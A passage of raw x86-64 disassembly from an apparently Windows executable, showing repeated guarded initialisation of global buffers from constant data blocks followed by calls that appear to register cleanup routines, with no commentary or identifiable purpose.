   140007896:	48 8d 0d a3 13 00 00 	lea    0x13a3(%rip),%rcx        # 0x140008c40
   14000789d:	e8 ce 9a ff ff       	call   0x140001370
   1400078a2:	c6 05 e8 89 2b 00 01 	movb   $0x1,0x2b89e8(%rip)        # 0x1402c0291
   1400078a9:	80 3d 7a 8f 2b 00 00 	cmpb   $0x0,0x2b8f7a(%rip)        # 0x1402c082a
   1400078b0:	0f 85 d0 d5 ff ff    	jne    0x140004e86
   1400078b6:	e9 43 d6 ff ff       	jmp    0x140004efe
   1400078bb:	48 8d 0d 52 46 00 00 	lea    0x4652(%rip),%rcx        # 0x14000bf14
   1400078c2:	e8 99 13 00 00       	call   0x140008c60
   1400078c7:	48 8d 0d 62 14 00 00 	lea    0x1462(%rip),%rcx        # 0x140008d30
   1400078ce:	e8 9d 9a ff ff       	call   0x140001370
   1400078d3:	c6 05 b8 89 2b 00 01 	movb   $0x1,0x2b89b8(%rip)        # 0x1402c0292
   1400078da:	80 3d 71 8f 2b 00 00 	cmpb   $0x0,0x2b8f71(%rip)        # 0x1402c0852
   1400078e1:	0f 85 4a d6 ff ff    	jne    0x140004f31
   1400078e7:	e9 9b d6 ff ff       	jmp    0x140004f87
   1400078ec:	c6 05 87 8f 2b 00 01 	movb   $0x1,0x2b8f87(%rip)        # 0x1402c087a
   1400078f3:	66 0f 6f 05 55 3f 00 	movdqa 0x3f55(%rip),%xmm0        # 0x14000b850
   1400078fa:	00 
   1400078fb:	66 0f 7f 05 5d 8f 2b 	movdqa %xmm0,0x2b8f5d(%rip)        # 0x1402c0860
   140007902:	00 
   140007903:	48 b8 05 00 0c 00 17 	movabs $0x160017000c0005,%rax
   14000790a:	00 16 00 
   14000790d:	48 89 05 5c 8f 2b 00 	mov    %rax,0x2b8f5c(%rip)        # 0x1402c0870
   140007914:	66 c7 05 5b 8f 2b 00 	movw   $0xa3,0x2b8f5b(%rip)        # 0x1402c0878
   14000791b:	a3 00 
   14000791d:	48 8d 0d 2c 14 00 00 	lea    0x142c(%rip),%rcx        # 0x140008d50
   140007924:	e8 47 9a ff ff       	call   0x140001370
   140007929:	c6 05 63 89 2b 00 01 	movb   $0x1,0x2b8963(%rip)        # 0x1402c0293
   140007930:	80 3d 43 8f 2b 00 00 	cmpb   $0x0,0x2b8f43(%rip)        # 0x1402c087a
   140007937:	0f 85 7d d6 ff ff    	jne    0x140004fba
   14000793d:	e9 d2 d6 ff ff       	jmp    0x140005014
   140007942:	c6 05 53 8f 2b 00 01 	movb   $0x1,0x2b8f53(%rip)        # 0x1402c089c
   140007949:	66 0f 6f 05 2f 3f 00 	movdqa 0x3f2f(%rip),%xmm0        # 0x14000b880
   140007950:	00 
   140007951:	66 0f 7f 05 27 8f 2b 	movdqa %xmm0,0x2b8f27(%rip)        # 0x1402c0880
   140007958:	00 
   140007959:	48 b8 4b 00 56 00 5a 	movabs $0x5d005a0056004b,%rax
   140007960:	00 5d 00 
   140007963:	48 89 05 26 8f 2b 00 	mov    %rax,0x2b8f26(%rip)        # 0x1402c0890
   14000796a:	c7 05 24 8f 2b 00 4a 	movl   $0xe7004a,0x2b8f24(%rip)        # 0x1402c0898
   140007971:	00 e7 00 
   140007974:	48 8d 0d f5 13 00 00 	lea    0x13f5(%rip),%rcx        # 0x140008d70
   14000797b:	e8 f0 99 ff ff       	call   0x140001370
   140007980:	c6 05 0d 89 2b 00 01 	movb   $0x1,0x2b890d(%rip)        # 0x1402c0294
   140007987:	80 3d 0e 8f 2b 00 00 	cmpb   $0x0,0x2b8f0e(%rip)        # 0x1402c089c
   14000798e:	0f 85 b3 d6 ff ff    	jne    0x140005047
   140007994:	e9 15 d7 ff ff       	jmp    0x1400050ae
   140007999:	c6 05 76 8f 2b 00 01 	movb   $0x1,0x2b8f76(%rip)        # 0x1402c0916
   1400079a0:	0f 10 05 8f 45 00 00 	movups 0x458f(%rip),%xmm0        # 0x14000bf36
   1400079a7:	0f 29 05 f2 8e 2b 00 	movaps %xmm0,0x2b8ef2(%rip)        # 0x1402c08a0
   1400079ae:	0f 10 05 91 45 00 00 	movups 0x4591(%rip),%xmm0        # 0x14000bf46
   1400079b5:	0f 29 05 f4 8e 2b 00 	movaps %xmm0,0x2b8ef4(%rip)        # 0x1402c08b0
   1400079bc:	0f 10 05 93 45 00 00 	movups 0x4593(%rip),%xmm0        # 0x14000bf56
   1400079c3:	0f 29 05 f6 8e 2b 00 	movaps %xmm0,0x2b8ef6(%rip)        # 0x1402c08c0
   1400079ca:	0f 10 05 95 45 00 00 	movups 0x4595(%rip),%xmm0        # 0x14000bf66
   1400079d1:	0f 29 05 f8 8e 2b 00 	movaps %xmm0,0x2b8ef8(%rip)        # 0x1402c08d0
   1400079d8:	0f 10 05 97 45 00 00 	movups 0x4597(%rip),%xmm0        # 0x14000bf76
   1400079df:	0f 29 05 fa 8e 2b 00 	movaps %xmm0,0x2b8efa(%rip)        # 0x1402c08e0
   1400079e6:	0f 10 05 99 45 00 00 	movups 0x4599(%rip),%xmm0        # 0x14000bf86
   1400079ed:	0f 29 05 fc 8e 2b 00 	movaps %xmm0,0x2b8efc(%rip)        # 0x1402c08f0
   1400079f4:	f3 0f 6f 05 9a 45 00 	movdqu 0x459a(%rip),%xmm0        # 0x14000bf96
   1400079fb:	00 
   1400079fc:	66 0f 7f 05 fc 8e 2b 	movdqa %xmm0,0x2b8efc(%rip)        # 0x1402c0900
   140007a03:	00 
   140007a04:	48 b8 e4 00 07 00 f4 	movabs $0x9100f4000700e4,%rax
   140007a0b:	00 91 00 
   140007a0e:	48 89 05 f9 8e 2b 00 	mov    %rax,0x2b8ef9(%rip)        # 0x1402c090e
   140007a15:	48 8d 0d 74 13 00 00 	lea    0x1374(%rip),%rcx        # 0x140008d90
   140007a1c:	e8 4f 99 ff ff       	call   0x140001370
   140007a21:	c6 05 6d 88 2b 00 01 	movb   $0x1,0x2b886d(%rip)        # 0x1402c0295
   140007a28:	80 3d e7 8e 2b 00 00 	cmpb   $0x0,0x2b8ee7(%rip)        # 0x1402c0916
   140007a2f:	0f 85 b0 d6 ff ff    	jne    0x1400050e5
   140007a35:	e9 a0 d7 ff ff       	jmp    0x1400051da
   140007a3a:	c6 05 f5 8e 2b 00 01 	movb   $0x1,0x2b8ef5(%rip)        # 0x1402c0936
   140007a41:	66 0f 6f 05 87 3e 00 	movdqa 0x3e87(%rip),%xmm0        # 0x14000b8d0
   140007a48:	00 
   140007a49:	66 0f 7f 05 cf 8e 2b 	movdqa %xmm0,0x2b8ecf(%rip)        # 0x1402c0920
   140007a50:	00 
   140007a51:	c7 05 d5 8e 2b 00 fc 	movl   $0x100fc,0x2b8ed5(%rip)        # 0x1402c0930
   140007a58:	00 01 00 
   140007a5b:	66 c7 05 d0 8e 2b 00 	movw   $0x91,0x2b8ed0(%rip)        # 0x1402c0934
   140007a62:	91 00 
   140007a64:	48 8d 0d 65 13 00 00 	lea    0x1365(%rip),%rcx        # 0x140008dd0
   140007a6b:	e8 00 99 ff ff       	call   0x140001370
   140007a70:	c6 05 1f 88 2b 00 01 	movb   $0x1,0x2b881f(%rip)        # 0x1402c0296
   140007a77:	80 3d b8 8e 2b 00 00 	cmpb   $0x0,0x2b8eb8(%rip)        # 0x1402c0936
   140007a7e:	0f 85 6c d7 ff ff    	jne    0x1400051f0
   140007a84:	e9 c1 d7 ff ff       	jmp    0x14000524a
   140007a89:	c6 05 32 8f 2b 00 01 	movb   $0x1,0x2b8f32(%rip)        # 0x1402c09c2
   140007a90:	48 8d 0d a9 8e 2b 00 	lea    0x2b8ea9(%rip),%rcx        # 0x1402c0940
   140007a97:	48 8d 15 0e 45 00 00 	lea    0x450e(%rip),%rdx        # 0x14000bfac
   140007a9e:	41 b8 82 00 00 00    	mov    $0x82,%r8d
   140007aa4:	e8 17 2b 00 00       	call   0x14000a5c0
   140007aa9:	48 8d 0d 40 13 00 00 	lea    0x1340(%rip),%rcx        # 0x140008df0
   140007ab0:	e8 bb 98 ff ff       	call   0x140001370
   140007ab5:	c6 05 db 87 2b 00 01 	movb   $0x1,0x2b87db(%rip)        # 0x1402c0297
   140007abc:	80 3d ff 8e 2b 00 00 	cmpb   $0x0,0x2b8eff(%rip)        # 0x1402c09c2
   140007ac3:	0f 85 ae d7 ff ff    	jne    0x140005277
   140007ac9:	e9 8f d8 ff ff       	jmp    0x14000535d
   140007ace:	48 8d 0d 59 45 00 00 	lea    0x4559(%rip),%rcx        # 0x14000c02e
   140007ad5:	e8 66 13 00 00       	call   0x140008e40
   140007ada:	48 8d 0d 2f 14 00 00 	lea    0x142f(%rip),%rcx        # 0x140008f10
   140007ae1:	e8 8a 98 ff ff       	call   0x140001370
   140007ae6:	c6 05 ab 87 2b 00 01 	movb   $0x1,0x2b87ab(%rip)        # 0x1402c0298
   140007aed:	80 3d fe 8e 2b 00 00 	cmpb   $0x0,0x2b8efe(%rip)        # 0x1402c09f2
   140007af4:	0f 85 79 d8 ff ff    	jne    0x140005373
   140007afa:	e9 ca d8 ff ff       	jmp    0x1400053c9
   140007aff:	c6 05 74 8f 2b 00 01 	movb   $0x1,0x2b8f74(%rip)        # 0x1402c0a7a
   140007b06:	0f 10 05 43 45 00 00 	movups 0x4543(%rip),%xmm0        # 0x14000c050
   140007b0d:	0f 29 05 ec 8e 2b 00 	movaps %xmm0,0x2b8eec(%rip)        # 0x1402c0a00
   140007b14:	0f 10 05 45 45 00 00 	movups 0x4545(%rip),%xmm0        # 0x14000c060
   140007b1b:	0f 29 05 ee 8e 2b 00 	movaps %xmm0,0x2b8eee(%rip)        # 0x1402c0a10
   140007b22:	0f 10 05 47 45 00 00 	movups 0x4547(%rip),%xmm0        # 0x14000c070
   140007b29:	0f 29 05 f0 8e 2b 00 	movaps %xmm0,0x2b8ef0(%rip)        # 0x1402c0a20
   140007b30:	0f 10 05 49 45 00 00 	movups 0x4549(%rip),%xmm0        # 0x14000c080
   140007b37:	0f 29 05 f2 8e 2b 00 	movaps %xmm0,0x2b8ef2(%rip)        # 0x1402c0a30
   140007b3e:	0f 10 05 4b 45 00 00 	movups 0x454b(%rip),%xmm0        # 0x14000c090
   140007b45:	0f 29 05 f4 8e 2b 00 	movaps %xmm0,0x2b8ef4(%rip)        # 0x1402c0a40
   140007b4c:	0f 10 05 4d 45 00 00 	movups 0x454d(%rip),%xmm0        # 0x14000c0a0
   140007b53:	0f 29 05 f6 8e 2b 00 	movaps %xmm0,0x2b8ef6(%rip)        # 0x1402c0a50
   140007b5a:	0f 10 05 4f 45 00 00 	movups 0x454f(%rip),%xmm0        # 0x14000c0b0
   140007b61:	0f 29 05 f8 8e 2b 00 	movaps %xmm0,0x2b8ef8(%rip)        # 0x1402c0a60
   140007b68:	f3 0f 6f 05 4a 45 00 	movdqu 0x454a(%rip),%xmm0        # 0x14000c0ba
   140007b6f:	00 
   140007b70:	f3 0f 7f 05 f2 8e 2b 	movdqu %xmm0,0x2b8ef2(%rip)        # 0x1402c0a6a
   140007b77:	00 
   140007b78:	48 8d 0d b1 13 00 00 	lea    0x13b1(%rip),%rcx        # 0x140008f30
   140007b7f:	e8 ec 97 ff ff       	call   0x140001370
   140007b84:	c6 05 0e 87 2b 00 01 	movb   $0x1,0x2b870e(%rip)        # 0x1402c0299
   140007b8b:	80 3d e8 8e 2b 00 00 	cmpb   $0x0,0x2b8ee8(%rip)        # 0x1402c0a7a
   140007b92:	0f 85 5e d8 ff ff    	jne    0x1400053f6
   140007b98:	e9 75 d9 ff ff       	jmp    0x140005512
   140007b9d:	c6 05 f6 8e 2b 00 01 	movb   $0x1,0x2b8ef6(%rip)        # 0x1402c0a9a
   140007ba4:	66 0f 6f 05 64 3d 00 	movdqa 0x3d64(%rip),%xmm0        # 0x14000b910
   140007bab:	00 
   140007bac:	66 0f 7f 05 cc 8e 2b 	movdqa %xmm0,0x2b8ecc(%rip)        # 0x1402c0a80
   140007bb3:	00 
   140007bb4:	48 b8 24 00 27 00 30 	movabs $0x35003000270024,%rax
   140007bbb:	00 35 00 
   140007bbe:	48 89 05 cb 8e 2b 00 	mov    %rax,0x2b8ecb(%rip)        # 0x1402c0a90
   140007bc5:	66 c7 05 ca 8e 2b 00 	movw   $0xc5,0x2b8eca(%rip)        # 0x1402c0a98
   140007bcc:	c5 00 
   140007bce:	48 8d 0d 9b 13 00 00 	lea    0x139b(%rip),%rcx        # 0x140008f70
   140007bd5:	e8 96 97 ff ff       	call   0x140001370
   140007bda:	c6 05 b9 86 2b 00 01 	movb   $0x1,0x2b86b9(%rip)        # 0x1402c029a
   140007be1:	80 3d b2 8e 2b 00 00 	cmpb   $0x0,0x2b8eb2(%rip)        # 0x1402c0a9a
   140007be8:	0f 85 3a d9 ff ff    	jne    0x140005528
   140007bee:	e9 8f d9 ff ff       	jmp    0x140005582
   140007bf3:	c6 05 18 8f 2b 00 01 	movb   $0x1,0x2b8f18(%rip)        # 0x1402c0b12
   140007bfa:	0f 10 05 c9 44 00 00 	movups 0x44c9(%rip),%xmm0        # 0x14000c0ca
   140007c01:	0f 29 05 98 8e 2b 00 	movaps %xmm0,0x2b8e98(%rip)        # 0x1402c0aa0
   140007c08:	0f 10 05 cb 44 00 00 	movups 0x44cb(%rip),%xmm0        # 0x14000c0da
   140007c0f:	0f 29 05 9a 8e 2b 00 	movaps %xmm0,0x2b8e9a(%rip)        # 0x1402c0ab0
   140007c16:	0f 10 05 cd 44 00 00 	movups 0x44cd(%rip),%xmm0        # 0x14000c0ea
   140007c1d:	0f 29 05 9c 8e 2b 00 	movaps %xmm0,0x2b8e9c(%rip)        # 0x1402c0ac0
   140007c24:	0f 10 05 cf 44 00 00 	movups 0x44cf(%rip),%xmm0        # 0x14000c0fa
   140007c2b:	0f 29 05 9e 8e 2b 00 	movaps %xmm0,0x2b8e9e(%rip)        # 0x1402c0ad0
   140007c32:	0f 10 05 d1 44 00 00 	movups 0x44d1(%rip),%xmm0        # 0x14000c10a
   140007c39:	0f 29 05 a0 8e 2b 00 	movaps %xmm0,0x2b8ea0(%rip)        # 0x1402c0ae0
   140007c40:	0f 10 05 d3 44 00 00 	movups 0x44d3(%rip),%xmm0        # 0x14000c11a
   140007c47:	0f 29 05 a2 8e 2b 00 	movaps %xmm0,0x2b8ea2(%rip)        # 0x1402c0af0
   140007c4e:	f3 0f 6f 05 d4 44 00 	movdqu 0x44d4(%rip),%xmm0        # 0x14000c12a
   140007c55:	00 
   140007c56:	66 0f 7f 05 a2 8e 2b 	movdqa %xmm0,0x2b8ea2(%rip)        # 0x1402c0b00
   140007c5d:	00 
   140007c5e:	66 c7 05 a9 8e 2b 00 	movw   $0xeb,0x2b8ea9(%rip)        # 0x1402c0b10
   140007c65:	eb 00 
   140007c67:	48 8d 0d 22 13 00 00 	lea    0x1322(%rip),%rcx        # 0x140008f90
   140007c6e:	e8 fd 96 ff ff       	call   0x140001370
   140007c73:	c6 05 21 86 2b 00 01 	movb   $0x1,0x2b8621(%rip)        # 0x1402c029b
   140007c7a:	80 3d 91 8e 2b 00 00 	cmpb   $0x0,0x2b8e91(%rip)        # 0x1402c0b12
   140007c81:	0f 85 28 d9 ff ff    	jne    0x1400055af
   140007c87:	e9 f1 d9 ff ff       	jmp    0x14000567d
   140007c8c:	c6 05 9f 8e 2b 00 01 	movb   $0x1,0x2b8e9f(%rip)        # 0x1402c0b32
   140007c93:	66 0f 6f 05 a5 3c 00 	movdqa 0x3ca5(%rip),%xmm0        # 0x14000b940
   140007c9a:	00 
   140007c9b:	66 0f 7f 05 7d 8e 2b 	movdqa %xmm0,0x2b8e7d(%rip)        # 0x1402c0b20
   140007ca2:	00 
   140007ca3:	66 c7 05 84 8e 2b 00 	movw   $0xeb,0x2b8e84(%rip)        # 0x1402c0b30
   140007caa:	eb 00 
   140007cac:	48 8d 0d 1d 13 00 00 	lea    0x131d(%rip),%rcx        # 0x140008fd0
   140007cb3:	e8 b8 96 ff ff       	call   0x140001370
   140007cb8:	c6 05 dd 85 2b 00 01 	movb   $0x1,0x2b85dd(%rip)        # 0x1402c029c
   140007cbf:	80 3d 6c 8e 2b 00 00 	cmpb   $0x0,0x2b8e6c(%rip)        # 0x1402c0b32
   140007cc6:	0f 85 c7 d9 ff ff    	jne    0x140005693
   140007ccc:	e9 fc d9 ff ff       	jmp    0x1400056cd
   140007cd1:	c6 05 dc 8e 2b 00 01 	movb   $0x1,0x2b8edc(%rip)        # 0x1402c0bb4
   140007cd8:	0f 10 05 5d 44 00 00 	movups 0x445d(%rip),%xmm0        # 0x14000c13c
   140007cdf:	0f 29 05 5a 8e 2b 00 	movaps %xmm0,0x2b8e5a(%rip)        # 0x1402c0b40
   140007ce6:	0f 10 05 5f 44 00 00 	movups 0x445f(%rip),%xmm0        # 0x14000c14c
   140007ced:	0f 29 05 5c 8e 2b 00 	movaps %xmm0,0x2b8e5c(%rip)        # 0x1402c0b50
   140007cf4:	0f 10 05 61 44 00 00 	movups 0x4461(%rip),%xmm0        # 0x14000c15c
   140007cfb:	0f 29 05 5e 8e 2b 00 	movaps %xmm0,0x2b8e5e(%rip)        # 0x1402c0b60
   140007d02:	0f 10 05 63 44 00 00 	movups 0x4463(%rip),%xmm0        # 0x14000c16c
   140007d09:	0f 29 05 60 8e 2b 00 	movaps %xmm0,0x2b8e60(%rip)        # 0x1402c0b70
   140007d10:	0f 10 05 65 44 00 00 	movups 0x4465(%rip),%xmm0        # 0x14000c17c
   140007d17:	0f 29 05 62 8e 2b 00 	movaps %xmm0,0x2b8e62(%rip)        # 0x1402c0b80
   140007d1e:	0f 10 05 67 44 00 00 	movups 0x4467(%rip),%xmm0        # 0x14000c18c
   140007d25:	0f 29 05 64 8e 2b 00 	movaps %xmm0,0x2b8e64(%rip)        # 0x1402c0b90
   140007d2c:	f3 0f 6f 05 68 44 00 	movdqu 0x4468(%rip),%xmm0        # 0x14000c19c
   140007d33:	00 
   140007d34:	66 0f 7f 05 64 8e 2b 	movdqa %xmm0,0x2b8e64(%rip)        # 0x1402c0ba0
   140007d3b:	00 
   140007d3c:	c7 05 6a 8e 2b 00 98 	movl   $0x350098,0x2b8e6a(%rip)        # 0x1402c0bb0
   140007d43:	00 35 00 
   140007d46:	48 8d 0d a3 12 00 00 	lea    0x12a3(%rip),%rcx        # 0x140008ff0
   140007d4d:	e8 1e 96 ff ff       	call   0x140001370
   140007d52:	c6 05 44 85 2b 00 01 	movb   $0x1,0x2b8544(%rip)        # 0x1402c029d
   140007d59:	80 3d 54 8e 2b 00 00 	cmpb   $0x0,0x2b8e54(%rip)        # 0x1402c0bb4
   140007d60:	0f 85 94 d9 ff ff    	jne    0x1400056fa
   140007d66:	e9 75 da ff ff       	jmp    0x1400057e0
   140007d6b:	c6 05 62 8e 2b 00 01 	movb   $0x1,0x2b8e62(%rip)        # 0x1402c0bd4
   140007d72:	66 0f 6f 05 e6 3b 00 	movdqa 0x3be6(%rip),%xmm0        # 0x14000b960
   140007d79:	00 
   140007d7a:	66 0f 7f 05 3e 8e 2b 	movdqa %xmm0,0x2b8e3e(%rip)        # 0x1402c0bc0
   140007d81:	00 
   140007d82:	c7 05 44 8e 2b 00 a5 	movl   $0x3500a5,0x2b8e44(%rip)        # 0x1402c0bd0
   140007d89:	00 35 00 
   140007d8c:	48 8d 0d 9d 12 00 00 	lea    0x129d(%rip),%rcx        # 0x140009030
   140007d93:	e8 d8 95 ff ff       	call   0x140001370
   140007d98:	c6 05 ff 84 2b 00 01 	movb   $0x1,0x2b84ff(%rip)        # 0x1402c029e
   140007d9f:	80 3d 2e 8e 2b 00 00 	cmpb   $0x0,0x2b8e2e(%rip)        # 0x1402c0bd4
   140007da6:	0f 85 4a da ff ff    	jne    0x1400057f6
   140007dac:	e9 8c da ff ff       	jmp    0x14000583d
   140007db1:	c6 05 44 8e 2b 00 01 	movb   $0x1,0x2b8e44(%rip)        # 0x1402c0bfc
   140007db8:	66 0f 6f 05 c0 3b 00 	movdqa 0x3bc0(%rip),%xmm0        # 0x14000b980
   140007dbf:	00 
   140007dc0:	66 0f 7f 05 18 8e 2b 	movdqa %xmm0,0x2b8e18(%rip)        # 0x1402c0be0
   140007dc7:	00 
   140007dc8:	48 b8 34 00 fb 00 32 	movabs $0x45003200fb0034,%rax
   140007dcf:	00 45 00 
   140007dd2:	48 89 05 17 8e 2b 00 	mov    %rax,0x2b8e17(%rip)        # 0x1402c0bf0
   140007dd9:	c7 05 15 8e 2b 00 32 	movl   $0xcd0032,0x2b8e15(%rip)        # 0x1402c0bf8
   140007de0:	00 cd 00 
   140007de3:	48 8d 0d 66 12 00 00 	lea    0x1266(%rip),%rcx        # 0x140009050
   140007dea:	e8 81 95 ff ff       	call   0x140001370
   140007def:	c6 05 a9 84 2b 00 01 	movb   $0x1,0x2b84a9(%rip)        # 0x1402c029f
   140007df6:	80 3d ff 8d 2b 00 00 	cmpb   $0x0,0x2b8dff(%rip)        # 0x1402c0bfc
   140007dfd:	0f 85 77 da ff ff    	jne    0x14000587a
   140007e03:	e9 d9 da ff ff       	jmp    0x1400058e1
   140007e08:	48 8d 0d a1 43 00 00 	lea    0x43a1(%rip),%rcx        # 0x14000c1b0
   140007e0f:	e8 5c 12 00 00       	call   0x140009070
   140007e14:	48 8d 0d b5 13 00 00 	lea    0x13b5(%rip),%rcx        # 0x1400091d0
   140007e1b:	e8 50 95 ff ff       	call   0x140001370
   140007e20:	c6 05 79 84 2b 00 01 	movb   $0x1,0x2b8479(%rip)        # 0x1402c02a0
   140007e27:	80 3d 0e 8e 2b 00 00 	cmpb   $0x0,0x2b8e0e(%rip)        # 0x1402c0c3c
   140007e2e:	0f 85 ec da ff ff    	jne    0x140005920
   140007e34:	e9 c5 db ff ff       	jmp    0x1400059fe
   140007e39:	48 8d 0d ac 43 00 00 	lea    0x43ac(%rip),%rcx        # 0x14000c1ec
   140007e40:	e8 ab 13 00 00       	call   0x1400091f0
   140007e45:	48 8d 0d 04 15 00 00 	lea    0x1504(%rip),%rcx        # 0x140009350
   140007e4c:	e8 1f 95 ff ff       	call   0x140001370
   140007e51:	c6 05 49 84 2b 00 01 	movb   $0x1,0x2b8449(%rip)        # 0x1402c02a1
   140007e58:	80 3d 1d 8e 2b 00 00 	cmpb   $0x0,0x2b8e1d(%rip)        # 0x1402c0c7c
   140007e5f:	0f 85 d0 db ff ff    	jne    0x140005a35
   140007e65:	e9 a9 dc ff ff       	jmp    0x140005b13
   140007e6a:	48 8d 0d b7 43 00 00 	lea    0x43b7(%rip),%rcx        # 0x14000c228
   140007e71:	e8 fa 14 00 00       	call   0x140009370
   140007e76:	48 8d 0d 33 16 00 00 	lea    0x1633(%rip),%rcx        # 0x1400094b0
   140007e7d:	e8 ee 94 ff ff       	call   0x140001370
   140007e82:	c6 05 19 84 2b 00 01 	movb   $0x1,0x2b8419(%rip)        # 0x1402c02a2
   140007e89:	80 3d 28 8e 2b 00 00 	cmpb   $0x0,0x2b8e28(%rip)        # 0x1402c0cb8
   140007e90:	0f 85 b4 dc ff ff    	jne    0x140005b4a
   140007e96:	e9 62 dd ff ff       	jmp    0x140005bfd
   140007e9b:	48 8d 0d be 43 00 00 	lea    0x43be(%rip),%rcx        # 0x14000c260
   140007ea2:	e8 39 16 00 00       	call   0x1400094e0
   140007ea7:	48 8d 0d 72 17 00 00 	lea    0x1772(%rip),%rcx        # 0x140009620
   140007eae:	e8 bd 94 ff ff       	call   0x140001370
   140007eb3:	c6 05 e9 83 2b 00 01 	movb   $0x1,0x2b83e9(%rip)        # 0x1402c02a3
   140007eba:	80 3d 37 8e 2b 00 00 	cmpb   $0x0,0x2b8e37(%rip)        # 0x1402c0cf8
   140007ec1:	0f 85 70 dd ff ff    	jne    0x140005c37
   140007ec7:	e9 1e de ff ff       	jmp    0x140005cea
   140007ecc:	c6 05 87 84 2b 00 01 	movb   $0x1,0x2b8487(%rip)        # 0x1402c035a
   140007ed3:	0f 10 05 a6 3c 00 00 	movups 0x3ca6(%rip),%xmm0        # 0x14000bb80
   140007eda:	0f 29 05 ff 83 2b 00 	movaps %xmm0,0x2b83ff(%rip)        # 0x1402c02e0
   140007ee1:	0f 10 05 a8 3c 00 00 	movups 0x3ca8(%rip),%xmm0        # 0x14000bb90
   140007ee8:	0f 29 05 01 84 2b 00 	movaps %xmm0,0x2b8401(%rip)        # 0x1402c02f0
   140007eef:	0f 10 05 aa 3c 00 00 	movups 0x3caa(%rip),%xmm0        # 0x14000bba0
   140007ef6:	0f 29 05 03 84 2b 00 	movaps %xmm0,0x2b8403(%rip)        # 0x1402c0300
   140007efd:	0f 10 05 ac 3c 00 00 	movups 0x3cac(%rip),%xmm0        # 0x14000bbb0
   140007f04:	0f 29 05 05 84 2b 00 	movaps %xmm0,0x2b8405(%rip)        # 0x1402c0310
   140007f0b:	0f 10 05 ae 3c 00 00 	movups 0x3cae(%rip),%xmm0        # 0x14000bbc0
   140007f12:	0f 29 05 07 84 2b 00 	movaps %xmm0,0x2b8407(%rip)        # 0x1402c0320
   140007f19:	0f 10 05 b0 3c 00 00 	movups 0x3cb0(%rip),%xmm0        # 0x14000bbd0
   140007f20:	0f 29 05 09 84 2b 00 	movaps %xmm0,0x2b8409(%rip)        # 0x1402c0330
   140007f27:	0f 10 05 b2 3c 00 00 	movups 0x3cb2(%rip),%xmm0        # 0x14000bbe0
   140007f2e:	0f 29 05 0b 84 2b 00 	movaps %xmm0,0x2b840b(%rip)        # 0x1402c0340
   140007f35:	f3 0f 6f 05 ad 3c 00 	movdqu 0x3cad(%rip),%xmm0        # 0x14000bbea
   140007f3c:	00 
   140007f3d:	f3 0f 7f 05 05 84 2b 	movdqu %xmm0,0x2b8405(%rip)        # 0x1402c034a
   140007f44:	00 
   140007f45:	48 8d 0d d4 b8 ff ff 	lea    -0x472c(%rip),%rcx        # 0x140003820
   140007f4c:	e8 1f 94 ff ff       	call   0x140001370
   140007f51:	c6 05 22 83 2b 00 01 	movb   $0x1,0x2b8322(%rip)        # 0x1402c027a
   140007f58:	80 3d fb 83 2b 00 00 	cmpb   $0x0,0x2b83fb(%rip)        # 0x1402c035a
   140007f5f:	0f 85 41 de ff ff    	jne    0x140005da6
   140007f65:	e9 58 df ff ff       	jmp    0x140005ec2
   140007f6a:	48 8d 0d 27 43 00 00 	lea    0x4327(%rip),%rcx        # 0x14000c298
   140007f71:	e8 da 16 00 00       	call   0x140009650
   140007f76:	48 8d 0d c3 17 00 00 	lea    0x17c3(%rip),%rcx        # 0x140009740
   140007f7d:	e8 ee 93 ff ff       	call   0x140001370
   140007f82:	c6 05 1b 83 2b 00 01 	movb   $0x1,0x2b831b(%rip)        # 0x1402c02a4
   140007f89:	80 3d 9a 8d 2b 00 00 	cmpb   $0x0,0x2b8d9a(%rip)        # 0x1402c0d2a
   140007f90:	0f 85 e6 e0 ff ff    	jne    0x14000607c
   140007f96:	e9 59 e1 ff ff       	jmp    0x1400060f4
   140007f9b:	c6 05 f0 8d 2b 00 01 	movb   $0x1,0x2b8df0(%rip)        # 0x1402c0d92
   140007fa2:	0f 10 05 19 43 00 00 	movups 0x4319(%rip),%xmm0        # 0x14000c2c2
   140007fa9:	0f 29 05 80 8d 2b 00 	movaps %xmm0,0x2b8d80(%rip)        # 0x1402c0d30
   140007fb0:	0f 10 05 1b 43 00 00 	movups 0x431b(%rip),%xmm0        # 0x14000c2d2
   140007fb7:	0f 29 05 82 8d 2b 00 	movaps %xmm0,0x2b8d82(%rip)        # 0x1402c0d40
   140007fbe:	0f 10 05 1d 43 00 00 	movups 0x431d(%rip),%xmm0        # 0x14000c2e2
   140007fc5:	0f 29 05 84 8d 2b 00 	movaps %xmm0,0x2b8d84(%rip)        # 0x1402c0d50
   140007fcc:	0f 10 05 1f 43 00 00 	movups 0x431f(%rip),%xmm0        # 0x14000c2f2
   140007fd3:	0f 29 05 86 8d 2b 00 	movaps %xmm0,0x2b8d86(%rip)        # 0x1402c0d60
   140007fda:	0f 10 05 21 43 00 00 	movups 0x4321(%rip),%xmm0        # 0x14000c302
   140007fe1:	0f 29 05 88 8d 2b 00 	movaps %xmm0,0x2b8d88(%rip)        # 0x1402c0d70
   140007fe8:	f3 0f 6f 05 22 43 00 	movdqu 0x4322(%rip),%xmm0        # 0x14000c312
   140007fef:	00 
   140007ff0:	66 0f 7f 05 88 8d 2b 	movdqa %xmm0,0x2b8d88(%rip)        # 0x1402c0d80
   140007ff7:	00 
   140007ff8:	66 c7 05 8f 8d 2b 00 	movw   $0x97,0x2b8d8f(%rip)        # 0x1402c0d90
   140007fff:	97 00 
   140008001:	48 8d 0d 58 17 00 00 	lea    0x1758(%rip),%rcx        # 0x140009760
   140008008:	e8 63 93 ff ff       	call   0x140001370
   14000800d:	c6 05 91 82 2b 00 01 	movb   $0x1,0x2b8291(%rip)        # 0x1402c02a5
   140008014:	80 3d 77 8d 2b 00 00 	cmpb   $0x0,0x2b8d77(%rip)        # 0x1402c0d92
   14000801b:	0f 85 0a e1 ff ff    	jne    0x14000612b
   140008021:	e9 bb e1 ff ff       	jmp    0x1400061e1
   140008026:	48 8d 0d 93 3e 00 00 	lea    0x3e93(%rip),%rcx        # 0x14000bec0
   14000802d:	e8 ee 09 00 00       	call   0x140008a20
   140008032:	48 8d 0d d7 0a 00 00 	lea    0xad7(%rip),%rcx        # 0x140008b10
   140008039:	e8 32 93 ff ff       	call   0x140001370
   14000803e:	c6 05 4a 82 2b 00 01 	movb   $0x1,0x2b824a(%rip)        # 0x1402c028f
   140008045:	80 3d 8e 87 2b 00 00 	cmpb   $0x0,0x2b878e(%rip)        # 0x1402c07da
   14000804c:	0f 85 8c cc ff ff    	jne    0x140004cde
   140008052:	e9 ff cc ff ff       	jmp    0x140004d56
